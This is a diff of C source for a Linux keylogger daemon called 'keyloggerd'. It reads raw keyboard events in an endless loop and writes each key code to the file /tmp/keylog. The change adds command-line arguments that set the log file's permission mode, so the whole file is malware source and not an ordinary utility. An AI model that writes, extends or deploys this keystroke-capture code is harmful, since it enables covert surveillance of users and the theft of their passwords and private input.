@@ -6,27 +6,26 @@
 #include <string.h>
 #include <unistd.h>
 
+#include "input-args.h"
 #include "logger.h"
 #include "error.h"
 
 #define LOG_FILE "/tmp/keylog"
 #define BUFFSIZE 255
 
-int create_log(const char *log_file)
+int create_log(const cmd_args_t cmd_args)
 {
     int oflag, log_fd;
-    mode_t mode;    /* open for read/write */
     char path[BUFFSIZE];
 
     /* open for writing only, create file if doesn't exist, if file exists,
      * truncate it to 0 */
     oflag = (O_WRONLY | O_CREAT | O_TRUNC);
-    mode = O_WRONLY | S_IRUSR | S_IRGRP | S_IROTH; /* chmod 111 */
 
-    sprintf(path, "%s", log_file);
+    sprintf(path, "%s", LOG_FILE);
     logger.info("Log file: %s", path);
 
-    log_fd = open(path, oflag, mode);
+    log_fd = open(path, oflag, O_WRONLY | cmd_args.keylog_mode);
 
     return log_fd;
 }
@@ -96,7 +95,7 @@ void log_key(int fd, unsigned short code)
     write(fd, &c, 1);
 }
 
-void keyloggerd(void)
+void keyloggerd(cmd_args_t cmd_args)
 {
     int keyboard;
 
@@ -124,7 +123,7 @@ void keyloggerd(void)
 
     ssize_t n;
 
-    int log_fd = create_log(LOG_FILE);
+    int log_fd = create_log(cmd_args);
 
     while (1) {
         n = read(keyboard, &ev, sizeof(ev));
